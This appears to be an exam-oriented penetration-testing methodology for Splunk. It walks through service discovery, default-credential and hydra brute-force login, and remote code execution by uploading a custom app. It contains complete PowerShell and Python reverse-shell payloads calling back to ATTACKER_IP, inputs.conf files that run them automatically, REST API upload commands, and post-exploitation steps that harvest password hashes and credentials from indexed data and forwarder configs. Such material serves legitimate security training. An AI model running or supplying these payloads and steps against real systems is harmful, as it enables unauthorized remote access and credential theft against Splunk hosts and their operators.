# Splunk Methodology

## 1. Discovery

- [ ] Identify Splunk services: `nmap -sV -p 8000,8089 TARGET`
- [ ] Port 8000 = Splunk Web interface
- [ ] Port 8089 = Splunkd management/REST API
- [ ] Check for Splunk Free (no authentication enforced)
- [ ] Try default creds: `admin:changeme`
- [ ] Browse to `http://TARGET:8000` and check version/edition

### Version Fingerprinting

```bash
# Via API (even unauthenticated sometimes)
curl -k https://TARGET:8089/services/server/info

# Login page often leaks version in page source
curl -s http://TARGET:8000/en-US/account/login | grep -i version
```

---

## 2. Authentication Attacks

- [ ] Default credentials: `admin:changeme`
- [ ] Splunk Free edition → no auth at all, skip straight to app upload
- [ ] If locked out, try API on 8089 with same creds:
  ```bash
  curl -k -u admin:changeme https://TARGET:8089/services/authentication/users
  ```
- [ ] Brute force (last resort):
  ```bash
  hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET http-post-form "/en-US/account/login:username=^USER^&password=^PASS^:Incorrect"
  ```

### Decision Branch

```
Auth required?
├── No (Splunk Free) → Go directly to Section 3 (RCE)
├── Default creds work → Go to Section 3
└── Locked out → Brute force → If success → Section 3
```

---

## 3. RCE via Custom Splunk Application

This is THE primary attack path. Splunk applications can execute arbitrary scripts on the host. If you have admin access to the web UI, you have RCE.

### 3.1 App Directory Structure

```
splunk_shell/
├── bin/
│   ├── run.bat          # Windows: launches PowerShell payload
│   ├── run.ps1          # Windows: PowerShell reverse shell
│   └── rev.py           # Linux: Python reverse shell
└── default/
    └── inputs.conf      # Tells Splunk to execute our script
```

### 3.2 inputs.conf — Windows Target

```ini
[script://.\bin\run.bat]
disabled = false
interval = 10
sourcetype = shell
```

### 3.3 inputs.conf — Linux Target

```ini
[script:///opt/splunk/etc/apps/splunk_shell/bin/rev.py]
disabled = false
interval = 10
sourcetype = shell
```

### 3.4 run.bat (Windows Launcher)

```batch
@echo off
PowerShell.exe -exec bypass -file "%~dp0run.ps1"
```

### 3.5 run.ps1 (Windows Reverse Shell)

```powershell
$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}
$client.Close()
```

### 3.6 rev.py (Linux Reverse Shell)

```python
import sys,socket,os,pty

s=socket.socket()
s.connect(("ATTACKER_IP",PORT))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/bash")
```

### 3.7 Packaging and Deployment

- [ ] Create the directory structure above
- [ ] Edit payloads — replace `ATTACKER_IP` and `PORT`
- [ ] Choose the correct `inputs.conf` for target OS
- [ ] Package the app:
  ```bash
  tar -czf splunk_shell.tar.gz splunk_shell/
  ```
- [ ] Start your listener BEFORE uploading:
  ```bash
  nc -nlvp PORT
  ```
- [ ] Upload: **Settings → Apps → Install app from file → Choose File → Upload**
- [ ] Shell connects within 10 seconds (the `interval` value in inputs.conf)

### 3.8 Alternative: API-Based Deployment (No Web UI Needed)

```bash
# Upload app via REST API
curl -k -u admin:changeme https://TARGET:8089/services/apps/local \
  -d "name=splunk_shell" --data-urlencode "filename=true" \
  -F "appfile=@splunk_shell.tar.gz"

# Or use splunkbase-style install
curl -k -u admin:changeme \
  https://TARGET:8089/services/apps/local \
  -F "name=splunk_shell" \
  -F "update=true" \
  -F "filename=true" \
  -F "appfile=@splunk_shell.tar.gz"
```

---

## 4. Critical Pitfalls

> These will burn you on the exam if you forget them.

- [ ] **NO inline comments in inputs.conf** — Splunk's INI parser breaks on them. No `# comment` on the same line as a key-value pair.
- [ ] **Start listener BEFORE upload** — the script fires almost instantly after app install.
- [ ] **Wrong IP/port = silent failure** — double-check your payload values.
- [ ] **Ports below 1024 need sudo** — if using port 443, run `sudo nc -nlvp 443`.
- [ ] **uBlock Origin / browser extensions** — may block paste operations in Splunk's web UI. Use a clean browser profile or disable extensions.
- [ ] **inputs.conf path must be absolute on Linux** — relative paths won't resolve.

---

## 5. Post-Exploitation

- [ ] Check if Splunk runs as root:
  ```bash
  ps aux | grep -i splunk
  whoami
  id
  ```
- [ ] Splunk user hashes:
  ```bash
  cat /opt/splunk/etc/passwd
  ```
- [ ] Harvest indexed data for credentials:
  ```
  index=* password OR passwd OR secret OR key | head 100
  ```
- [ ] Check app configs for hardcoded creds:
  ```bash
  find /opt/splunk/etc/apps/ -name "*.conf" -exec grep -il "pass\|secret\|key\|token" {} \;
  ```
- [ ] Splunk forwarder credentials (Universal Forwarder):
  ```bash
  cat /opt/splunkforwarder/etc/system/local/outputs.conf
  ```

### Privilege Escalation Path

```
Got shell as splunk user
├── Running as root? → Already escalated
├── Running as splunk service account?
│   ├── Check sudo -l
│   ├── Check /opt/splunk/etc/passwd for reusable hashes
│   ├── Check indexed data for creds (search via CLI)
│   │   splunk search "index=* password" -auth admin:changeme
│   └── Splunk runs on high ports → look for other privesc vectors
└── Universal Forwarder? → deployment server creds in outputs.conf
```

---

## 6. Full Decision Tree

```
Splunk Found (port 8000/8089)
│
├── Identify edition
│   ├── Splunk Free → No auth → Skip to app upload
│   └── Splunk Enterprise → Auth required
│       ├── Try admin:changeme
│       ├── Try common creds
│       └── Brute force as last resort
│
├── Got admin access?
│   ├── YES → Custom app upload → RCE
│   │   ├── Identify target OS
│   │   │   ├── Windows → inputs.conf + run.bat + run.ps1
│   │   │   └── Linux → inputs.conf + rev.py
│   │   ├── Package as tar.gz
│   │   ├── Start listener
│   │   ├── Upload via web UI or REST API
│   │   └── Catch shell
│   │
│   └── NO → Enumerate visible dashboards/data for info disclosure
│
└── Post-exploitation
    ├── Running as root? → Done
    ├── Harvest /opt/splunk/etc/passwd
    ├── Search indexed data for creds
    └── Check forwarder configs
```

---

## 7. Quick Reference Commands

| Action | Command |
|---|---|
| Nmap scan | `nmap -sV -p 8000,8089 TARGET` |
| Package app | `tar -czf splunk_shell.tar.gz splunk_shell/` |
| Start listener | `nc -nlvp PORT` |
| Splunk hashes | `cat /opt/splunk/etc/passwd` |
| Find configs | `find /opt/splunk -name "*.conf" -exec grep -il pass {} \;` |
| API login test | `curl -k -u admin:changeme https://TARGET:8089/services/authentication/users` |
